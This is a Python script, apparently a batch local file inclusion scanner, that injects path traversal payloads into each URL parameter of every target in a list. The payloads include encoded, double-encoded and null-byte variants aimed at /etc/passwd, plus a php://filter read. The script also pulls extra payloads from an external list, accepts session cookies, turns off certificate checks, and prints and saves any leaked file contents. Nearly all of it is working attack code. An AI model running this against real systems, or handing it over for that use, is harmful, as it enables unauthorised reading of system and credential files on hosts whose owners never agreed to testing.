#!/usr/bin/env python3
import requests
from urllib.parse import urlparse, parse_qs, urlencode, quote
import time
import sys
import os

class Colors:
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    WARNING = '\033[93m'
    OKCYAN = '\033[96m'
    HEADER = '\033[95m'
    DIM = '\033[2m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class SmartLFIScanner:
    def __init__(self, url, delay=0.2):
        self.url = url
        self.session = requests.Session()
        self.delay = delay
        self.findings = []
        self.authenticated = False
        
        # All payloads - core + GitHub
        self.payloads = []
        self.load_all_payloads()

    def load_all_payloads(self):
        """Dynamically load and generate payloads including double-encoded bypasses"""
        
        # 1. Standard Core Payloads
        # These are your base, raw payloads.
        core = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ]
        
        # 2. DYNAMIC DOUBLE-ENCODING GENERATION
        # We generate these automatically to find the 'superfluous decode' vulns.
        # We encode the core payloads twice.
        # e.g. ../ -> ..%2f -> ..%252f
        double_encoded_payloads = []
        for p in core:
            # First pass: encode slashes and dots if needed (e.g. ../ -> ..%2f..)
            # safe='' ensures we encode everything necessary
            first_pass = quote(p, safe='')
            # Second pass: encode the % signs from the first pass (e.g. %2f -> %252f)
            second_pass = quote(first_pass, safe='')
            double_encoded_payloads.append(second_pass)
        
        # Combine: Try dynamically generated double-encoded versions first, then standard
        self.payloads = double_encoded_payloads + core
        
        # 3. Load External Payloads
        try:
            r = requests.get(
                "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/directory_traversal.txt",
                timeout=10
            )
            if r.status_code == 200:
                lines = [l.strip() for l in r.text.splitlines() if l.strip() and not l.startswith('#')]
                self.payloads.extend(lines)
                print(f"{Colors.OKGREEN}[+] Loaded {len(lines)} external payloads{Colors.ENDC}")
        except:
            pass
        
        # Remove duplicates
        self.payloads = list(dict.fromkeys(self.payloads))
        
        # 4. GENERATE NULL BYTE BYPASS VARIANTS
        # Appended to the end. These rely on safe='/%' to keep %00 intact.
        bypass_extensions = ['.png', '.jpg', '.jpeg', '.gif', '.txt']
        bypass_payloads = []
        
        for p in list(self.payloads):
            for ext in bypass_extensions:
                bypass_payloads.append(f"{p}%00{ext}")
        
        self.payloads.extend(bypass_payloads)
        # Final deduplication
        self.payloads = list(dict.fromkeys(self.payloads))

    def send(self, url, data=None):
        """Send request"""
        try:
            time.sleep(self.delay)
            if data:
                r = self.session.post(url, data=data, timeout=10, verify=False)
            else:
                r = self.session.get(url, timeout=10, verify=False)
            return r
        except Exception as e:
            return None

    def is_login_page(self, text):
        """Detect if response is a login page"""
        if not text:
            return False
        
        text_lower = text.lower()[:2000]
        login_indicators = [
            "login", "password", "username", "sign in", "signin",
            "authentication", "session expired", "please log in",
            "invalid credentials", "access denied", "unauthorized"
        ]
        
        matches = sum(1 for ind in login_indicators if ind in text_lower)
        return matches >= 2

    def handle_auth(self, url, original_response):
        """Prompt for cookies if login detected. 
           THIS FUNCTION WILL PAUSE EXECUTION AND ASK FOR INPUT."""
        
        print(f"\n{Colors.WARNING}{'='*70}{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] LOGIN REQUIRED DETECTED: {url}{Colors.ENDC}")
        print(f"{Colors.WARNING}{'='*70}{Colors.ENDC}")
        print(f"The target appears to require authentication.")
        print(f"\n{Colors.OKCYAN}Options:{Colors.ENDC}")
        print(f"  1. Provide a cookie below to scan authenticated.")
        print(f"  2. Press Enter to SKIP cookie and scan unauthenticated.")
        
        try:
            # THIS IS THE PROMPT THAT ASKS FOR THE SESSION ID
            phpsessid = input(f"\n{Colors.BOLD}Paste PHPSESSID value (or Enter to skip): {Colors.ENDC}").strip()
        except KeyboardInterrupt:
            print(f"\n{Colors.FAIL}[!] Input interrupted. Proceeding without cookies...{Colors.ENDC}")
            return original_response
        
        if not phpsessid:
            print(f"{Colors.WARNING}[!] No cookie provided. Testing URL unauthenticated...{Colors.ENDC}")
            return original_response
        
        # Set cookie
        domain = urlparse(url).netloc
        self.session.cookies.set('PHPSESSID', phpsessid, domain=domain)
        self.session.cookies.set('security_level', '0', domain=domain)
        
        print(f"{Colors.OKGREEN}[+] Cookie set. Re-testing connection...{Colors.ENDC}")
        self.authenticated = True
        
        # Test the cookie
        r = self.send(url)
        if r and not self.is_login_page(r.text):
            print(f"{Colors.OKGREEN}[+] Authentication successful!{Colors.ENDC}")
            return r
        else:
            print(f"{Colors.WARNING}[!] Still showing login page. Trying additional cookies...{Colors.ENDC}")
            self.prompt_additional_cookies(domain)
            new_r = self.send(url)
            return new_r if new_r else original_response

    def prompt_additional_cookies(self, domain):
        """Prompt for additional cookies if needed"""
        print(f"\n{Colors.OKCYAN}Enter additional cookies (name=value format, empty line to finish):{Colors.ENDC}")
        
        while True:
            try:
                cookie_input = input(f"  Cookie (name=value): ").strip()
                if not cookie_input:
                    break
                
                if '=' in cookie_input:
                    name, value = cookie_input.split('=', 1)
                    self.session.cookies.set(name.strip(), value.strip(), domain=domain)
                    print(f"    {Colors.DIM}Added: {name.strip()}{Colors.ENDC}")
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}Input interrupted.{Colors.ENDC}")
                break

    def smart_request(self, url, data=None):
        """Make request - handle auth automatically"""
        r = self.send(url, data)
        
        if r is None:
            return None
        
        # Check if login required
        if not self.authenticated and self.is_login_page(r.text):
            r = self.handle_auth(url, r)
        
        return r

    def is_vulnerable(self, base_text, base_len, attack_text, attack_len):
        """Detect if response indicates LFI"""
        if not attack_text or attack_len == 0:
            return False
            
        if attack_text == base_text:
            return False
        
        # Check for file content markers
        markers = ["root:", "daemon:", ":x:", "[boot loader]", "[fonts]", "HTTP_", "USER="]
        for m in markers:
            if m in attack_text:
                return True
        
        # Or significant size increase
        if attack_len > base_len + 200:
            return True
            
        return False

    def print_buffer(self, url, current, total):
        max_len = 80
        display = url if len(url) <= max_len else url[:77] + "..."
        sys.stdout.write(f"\r\033[K[{current}/{total}] {display}")
        sys.stdout.flush()

    def report(self, param, payload, data, url):
        print(f"\n\n{Colors.OKGREEN}{Colors.BOLD}{'='*70}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}{Colors.BOLD}[!] VULNERABILITY FOUND!{Colors.ENDC}")
        print(f"{Colors.OKGREEN}{Colors.BOLD}{'='*70}{Colors.ENDC}")
        print(f"    Parameter: {Colors.BOLD}{param}{Colors.ENDC}")
        print(f"    Payload: {Colors.OKCYAN}{payload}{Colors.ENDC}")
        print(f"    URL: {url}")
        print(f"    Response Length: {len(data)} bytes")
        print(f"\n[!] RESPONSE DATA:")
        print(f"{Colors.DIM}{'-'*70}{Colors.ENDC}")
        
        lines = data.split('\n')
        for line in lines[:50]:
            if len(line) > 120:
                line = line[:117] + "..."
            print(line)
        
        if len(lines) > 50:
            print(f"\n... {len(lines) - 50} more lines ...")
            
        print(f"{Colors.DIM}{'-'*70}{Colors.ENDC}")

        filename = f"LFI_VULN_{param}_{int(time.time())}.txt"
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"TARGET: {self.url}\n")
                f.write(f"VULNERABLE PARAMETER: {param}\n")
                f.write(f"PAYLOAD USED: {payload}\n")
                f.write(f"FULL URL: {url}\n")
                f.write(f"RESPONSE LENGTH: {len(data)} bytes\n")
                f.write("="*70 + "\n")
                f.write("FULL RESPONSE BODY:\n")
                f.write("="*70 + "\n")
                f.write(data)
            
            print(f"\n{Colors.OKGREEN}[+] Full response saved to file: {filename}{Colors.ENDC}")
        except Exception as e:
            print(f"\n{Colors.FAIL}[!] Failed to save file: {e}{Colors.ENDC}")

    def run(self):
        parsed = urlparse(self.url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)
        
        if not params:
            print(f"{Colors.FAIL}[!] No parameters found in URL!{Colors.ENDC}")
            return
        
        print(f"Target: {self.url}")
        print(f"Parameters: {Colors.OKCYAN}{list(params.keys())}{Colors.ENDC}")
        
        # Test first request
        print(f"\n{Colors.DIM}[*] Testing connection...{Colors.ENDC}")
        test_r = self.smart_request(self.url)
        
        if test_r is None:
            print(f"{Colors.FAIL}[!] Connection failed. Skipping.{Colors.ENDC}")
            return
        
        if self.authenticated:
            print(f"{Colors.OKGREEN}[*] Using authenticated session{Colors.ENDC}")
        else:
            if self.is_login_page(test_r.text):
                print(f"{Colors.WARNING}[*] Target is a login page. Testing payloads...{Colors.ENDC}")
        
        # Test each parameter
        for param_name in params:
            print(f"\n{Colors.HEADER}[*] Testing parameter: {Colors.BOLD}{param_name}{Colors.ENDC}{Colors.ENDC}")
            
            # Baseline
            baseline_params = params.copy()
            baseline_params[param_name] = ["test123"]
            baseline_url = base + "?" + urlencode(baseline_params, doseq=True, safe='/%')
            
            base_r = self.smart_request(baseline_url)
            if base_r is None:
                continue
            
            base_text = base_r.text
            base_len = len(base_text)
            print(f"    Baseline: {base_len} bytes")
            
            # Test all payloads
            total = len(self.payloads)
            print(f"    Testing {total} payloads...")
            
            found = False
            for i, payload in enumerate(self.payloads, 1):
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                # CRITICAL: safe='/%'
                # 1. Preserves %00 (Null Byte) because % is safe.
                # 2. Preserves dynamically generated %252f (Double Encode) because % is safe.
                full_url = base + "?" + urlencode(test_params, doseq=True, safe='/%')
                
                self.print_buffer(full_url, i, total)
                
                r = self.smart_request(full_url)
                if r is None:
                    continue
                
                if self.is_vulnerable(base_text, base_len, r.text, len(r.text)):
                    self.print_buffer("", 0, 0)
                    self.report(param_name, payload, r.text, full_url)
                    found = True
                    break
            
            print()
            if found:
                return
        
        print(f"\n{Colors.DIM}[*] Scan complete for this target.{Colors.ENDC}")


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    
    print(f"{Colors.HEADER}{'='*70}{Colors.ENDC}")
    print(f"{Colors.HEADER}{' LFI Scanner v24 (Dynamic Bypass) - Batch Mode ':*^70}{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*70}{Colors.ENDC}")
    print(f"{Colors.DIM}Press Ctrl+C at any time to exit the entire batch scan.{Colors.ENDC}")

    while True:
        filename = input(f"\n{Colors.BOLD}Enter file containing URLs: {Colors.ENDC}").strip()
        if os.path.exists(filename):
            break
        print(f"{Colors.FAIL}[!] File not found: {filename}. Please try again.{Colors.ENDC}")

    try:
        with open(filename, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error reading file: {e}{Colors.ENDC}")
        sys.exit(1)

    if not urls:
        print(f"{Colors.WARNING}[!] No URLs found in file.{Colors.ENDC}")
        sys.exit(0)

    print(f"{Colors.OKCYAN}[*] Loaded {len(urls)} targets. Starting batch scan...{Colors.ENDC}")

    try:
        for index, url in enumerate(urls, 1):
            print(f"\n{Colors.BOLD}{'#'*70}{Colors.ENDC}")
            print(f"{Colors.BOLD}# Target {index}/{len(urls)}: {url}{Colors.ENDC}")
            print(f"{Colors.BOLD}{'#'*70}{Colors.ENDC}")
            
            if not url.startswith('http'):
                url = 'http://' + url
            
            try:
                scanner = SmartLFIScanner(url)
                scanner.run()
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error scanning {url}: {e}{Colors.ENDC}")
                continue

        print(f"\n{Colors.OKGREEN}{'='*70}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] All targets processed. Exiting.{Colors.ENDC}")
        print(f"{Colors.OKGREEN}{'='*70}{Colors.ENDC}")

    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Ctrl+C detected. Aborting batch scan.{Colors.ENDC}")
        sys.exit(0)
